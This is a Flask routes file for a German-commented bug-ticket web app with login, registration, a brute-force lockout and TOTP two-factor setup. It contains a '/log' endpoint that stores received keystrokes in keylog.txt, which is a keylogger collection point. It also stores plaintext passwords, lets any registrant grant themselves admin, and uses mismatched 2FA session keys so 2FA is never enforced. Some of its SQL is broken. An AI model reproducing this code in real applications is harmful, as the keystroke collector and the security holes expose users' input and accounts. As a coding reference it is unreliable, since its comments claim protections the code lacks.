from ticket import app, db # Einbinden von Variable db und app aus __init__.py
from flask import render_template, request, redirect, url_for, jsonify, session, send_file # import von Methoden aus Flask
from sqlalchemy import text # Import von Methode text() von sqlalchemy
import datetime
from collections import defaultdict
import time
import pyotp
import io
import qrcode

# Globale Variable zum Speichern von fehlgeschlagenen Logins (Brute Force Schutz)
failed_logins = defaultdict(list)       # Schema: {ip:[timestamp1, timestamp2, timestamp3, ...], ip2: [...]}
MAX_ATTEMPTS = 5
LOCKOUT_SECONDS = 300  # 5 Minuten

# Route für Homepage auf "http://127.0.0.1:5000/"
@app.route("/")
def home_page():
    # laden der home.html
    return render_template("home.html")

# Route für Tickets auf "http://127.0.0.1:5000/tickets"
@app.route("/tickets")
def tickets_page():
    # Überprüfen ob Session vorhanden (also eingeloggt):
    if not session.get("username"):
        # Wenn nicht dann weiterleiten zu login_page zum Anmelden
        return redirect(url_for("login_page"))
    
    # Wenn ja, also bereits angemeldet
    query_stmt = text("select * from bugitems")          # parametrisierte query Statement --> sicher gegen SQL-Injection
    result = db.session.execute(query_stmt)   # Ergebnis der Abfrage aus DB in result speichern
    items = result.fetchall()                       # konvertiert ergebnis in Liste mit Tupeln 
    #items = result.mappings().all()
    #z.b. [(1, "Anmeldung fehlschlägt", "Offen", "2024-12-01"), (2, "Seite lädt langsam", "In Bearbeitung", "2024-12-05"), ...]

    print(items)

    return render_template("tickets.html", items=items)  # tickets.html wird geladen und es stellt Variable items und name zur Verfügung in tickets.html zum Einbinden


@app.route("/register", methods=["GET", "POST"])
def register_page():
    if request.method == "POST":
    # Wenn POST Request d.h. Formulardaten abgeschickt werden --> soll hier die daten verarbeitet werden und in DB gespeichert werden!!
        print("post")
        # Formulardaten speichern
        username = request.form.get("username")
        email = request.form.get("email")
        password1 = request.form.get("password1")
        password2 = request.form.get("password2")
        isAdmin = int(bool(request.form.get("is_admin")))
        print(username, email, password1, password2, isAdmin)

        # Wenn Passwörter übereinstimmen --> Registrierung erfolgreich und Formulardaten in DB speichern
        if password1 == password2:

            # 2FA erzeugen mit pyotp
            totp_secret = pyotp.random_base32()     # zufälliger base32 gecodedeter String-Secret

            # parametriesiertes Statement, damit sicher gegen SQL-Injection
            queryStmt = text("Insert into bugusers(username, email_address, password, is_admin, totp_secret) values(:username, :email, :password, :is_admin , :totp_secret)")     
            result = db.session.execute(queryStmt, {
                "username": username,
                "email": email,
                "password": password1,
                "is_admin": isAdmin,
                "totp_secret": totp_secret
            })
            # Ohne Commit werden Daten nicht gespeichert in DB
            db.session.commit()
            print(result)

            # Bei ERfolg bekommt User eine Meldung auf Login_page mit Meldung von success
            success= f"Register was successful. You can now login with your Username:{username} and your created Password."
            print(success)
            # bei redirect können keine extra variablen übergeben werden wie bei render_template, 
            # deshalb wird hier success variable im link mit übergeben im request-header --> so kann daten im link in login.html übergeben werden und eingbunden werden
            return redirect(f"/login?success={success}")    # !! könnte man auch mit cookie machen !!
                                                            #resp = make_response(redirect("/login"))
                                                            #resp.set_cookie("success", success, max_age=5)  # läuft nach 5 Sekunden ab
                                                            #return resp
        
        # wenn passwort nicht übereinstimmt
        if password1 != password2:
            failure = " Passwords doesn't match"
            # register.html wird erneut geladen und es wird failure-Nachricht angezeigt
            return render_template("register.html", failure=failure)
    
    if request.method == "GET":
    ## Anzeigen der register-Page und nichts weiter
        return render_template("register.html")


@app.route("/login", methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        print("post")

        username = request.form.get("username")         # strip()--> entfernt Leerzeichen (oder Whitespace-Zeichen wie \n, \t) am Anfang und Ende eines Strings
        password = request.form.get("password")         # verhindert ein paar SQL injections, deshalb weglassen

        print(username, password)

        now = time.time()
        # Brute Force Schutz
        # Schritt 1: Prüfen ob Benutzer/IP gesperrt
        attempts = failed_logins[username]
        # Veraltete Einträge löschen
        attempts = [ts for ts in attempts if now -ts < LOCKOUT_SECONDS]
        failed_logins[username] = attempts

        if len(attempts) >= MAX_ATTEMPTS:
            wait_time = int(LOCKOUT_SECONDS - (now - attempts[-1]))
            msg = f"Too many failed attempts. Please wait {wait_time} seconds and try again."
            return render_template("login.html", msg=msg) 

        # Schritt 2: Login-Versuch prüfen
        query_stmt = text("select username, is_admin from bugusers where username = :username and password = :password")
        print(query_stmt)
        result = db.session.execute(query_stmt, {"username": username, "password": password})
        buguser = result.fetchone()
        print(buguser)

        if not buguser:
            # Schritt 3: Fehlversuch speichern
            failed_logins[username].append(now)
            print("kein user und passwort in db dazu")
            msg = "no user with this credentials found. False Username or Passwor. Try again"
            return render_template("login.html", msg=msg)
        else:
            # Schritt 4: Bei Erfolg Einträge löschen
            failed_logins.pop(username, None)
            
            print("hat geklappt")
            # Session mit Username aus login-feld: username
            session['username'] = username

            isAdmin = "True" if buguser.is_admin else "False"
            # session mit kennzeichnung dass admin ist
            session['isAdmin'] = isAdmin

            session["2fa_verified"] = False
            
            return redirect(url_for("verify2fa_page"))
       
    return render_template("login.html")


@app.route("/moreInfo", methods=["GET", "POST"])
def moreInfo_page():
    ticketId = request.args.get("ticketId")
    
    if request.method == "GET":
        #Datenbank Infos von Datenbank abholen und in html anzeigen
        print("get")
        queryStmnt = text("select * from bugitems where id= :ticketId")
        result = db.session.execute(queryStmnt, {"ticketId": ticketId})
        ticketItem = result.fetchone()
        print(ticketItem)
        return render_template("moreInfo.html", ticketItem=ticketItem)
    
    if request.method == "POST":
        print("post")
        # Geänderte TicketItem Werte in Form mit alter table in bugitems übernehmen
        priority = request.form.get("priority")
        username = request.form.get("username")
        title = request.form.get("title")
        description = request.form.get("description")
        print(priority, username, title, description)

        queryStmnt = text("""
            "update bugitems set
            priority= :priority,
            username= :username,
            title= :title,
            description= :description
            where id= :ticketId
        """)

        db.session.execute(queryStmnt, {
            "priority": priority,
            "username": username,
            "title": title,
            "description": description,
            "ticketId": ticketId
        })

        db.session.commit()
        return redirect("/tickets")


@app.route("/logout")
def logout_page():
    # Session mit Username und Session mit isAdmin Kennzeichnung wird gelöscht
    session.pop('username', None)
    session.pop('isAdmin', None)
    return redirect(url_for('home_page'))


@app.route("/newTicket", methods=["GET", "POST"])
def newTicket_page():
    print("jetzt in ticket_page-function")
    name = session.get("username")
    print(name)

    # Wenn nicht angemeldet, dann Weiterleiten an login_page und fertig hier 
    # --> muss nicht zwingend angemeldet sein, da auch GET-Request auf /newTicket gemacht werden kann ohne eigeloogt zu sein( nur über Adressleiste, da Button habe ich entfernt bei Nicht-Eingeloggtem User)
    if not name:
        print("nicht angemeldet")
        return redirect(url_for("login_page"))  # wichtig: return nicht vergessen, sonst durchläuft programm weiterhin funktion, was man nicht will
    
    ## alles was folgt wird nur noch ausgeführt wenn angemeldet
    # wenn post request gesendet wird, dass heißt formular abgeschickt wird
    if request.method == "POST":
        print("post")

        # Formulardaten abspeichern
        priority = request.form.get("priority")
        username = request.form.get("username")
        title = request.form.get("title")
        description = request.form.get("description")

        print(priority, username, title, description)

        # in Datenbank schreiben
        stmt = text("INSERT INTO bugitems(priority, username, title, description) VALUES (:priority, :username, :title, :description)")
        db.session.execute(stmt, {
            "priority": priority,
            "username": username,
            "title": title,
            "description": description
        })

        #print(result)
        # Speichern der DAten in DB
        db.session.commit()

        # anhängen Session mit angemeldetem Username 
        session['username'] = name
         # weiterleiten zu Ticketübersicht-Page
        return redirect(url_for('tickets_page'))
    
    if request.method == "GET":
        return render_template("newTicket.html")
    
    #return render_template("newTicket.html") --> kann auch so gemacht werden, da der einzige Fall wo der Code noch hierunterkommt ist wenn es ein GET-Request ist !!


@app.route("/account")
def account_page():
    print("jetzt in account page")

    loggedName = session.get("username")
    isAdmin = session.get("isAdmin")
    print(loggedName, isAdmin)

    # Überprüfen ob ein session gesetzt/gespeichert ist
    if not loggedName:
        # Wenn nicht dann weiterleiten zu login_page zum Anmelden
        return redirect(url_for("login_page"))
    
    # Wenn ja, also bereits angemeldet
    if loggedName:
        # wenn User ein Admin ist ( muss als String verglichen werden, da request.cookies.get("isAdmin") der Wert davon wird als String gespeichert !!!!)
        if isAdmin == "True":
            query_stmt = text("select * from bugusers;")        # select-Operation für Abfrage aller User Konten, weil Admin
            result = db.session.execute(query_stmt)

        # wenn User kein Admin ist
        if isAdmin == "False":
            query_stmt = text("select * from bugusers where username = :loggedName;")
            result = db.session.execute(query_stmt, {"username": loggedName})   # Ergebnis der Abfrage aus DB in result speichern

        users = result.fetchall()                       # konvertiert ergebnis in Liste mit Tupeln 
        print(users)

        return render_template("account.html", users=users, loggedName=loggedName)  # account.html wird geladen und es stellt Variable users und name zur Verfügung in account.html zum Einbinden
    

@app.route("/faq", methods=["GET", "POST"])
def faq_page():
    print("jetzt in faq-Page.")
    print('test')
    confirm = None

    if request.method == "POST":
        question = request.form.get("question")
        print(question)
        if question:
            confirm = f"Deine Frage: '{question}' wurde übermitellt und wird so schnell wie möglich beantwortet."

    return render_template("faq.html", confirm=confirm)


@app.route("/log", methods=["POST"])
def log_key():
    print(">>> log_key wurde aufgerufen")  # Debug
    data = request.get_json()
    print(">>> empfangene Daten:", data)   # Debug
    key = data.get('key')
    with open('keylog.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()} - {key}\n")
    return jsonify({"status":"logged"}), 200
        

@app.route("/setup2fa")
def setup_2fa():
    if not session.get("username"):
        return redirect("/login")
    
    # Hol Benuzter und totp_secret
    user = session["username"]
    query = text("select totp_secret from bugusers where username = :user")
    result = db.session.execute(query, {"user": user}).fetchone()

    if not result or not result.totp_secret:
        return "TOTP not set."
    
    totp_uri = pyotp.totp.TOTP(result.totp_secret).provisioning_uri(name=user, issuer_name="BugBountyApp")

    # Qr Code erzeugen
    img = qrcode.make(totp_uri)
    buf = io.BytesIO()
    img.save(buf)
    buf.seek(0)

    return send_file(buf, mimetype="image/png")

@app.route("/verify2fa", methods=["GET", "POST"])
def verify2fa_page():
    if request.method == "POST":
        token = request.form["token"]
        user = session.get("username")
        query = text("select totp_secret from bugusers where username = :user")
        result = db.session.execute(query, {"user": user}).fetchone()

        if result and pyotp.TOTP(result.totp_secret).verify(token):
            session["2fa-verified"] = True
            return redirect(url_for("tickets_page"))
        else:
            return render_template("verify2fa.html", error= "Invalid token")
        
    return render_template("verify2fa.html")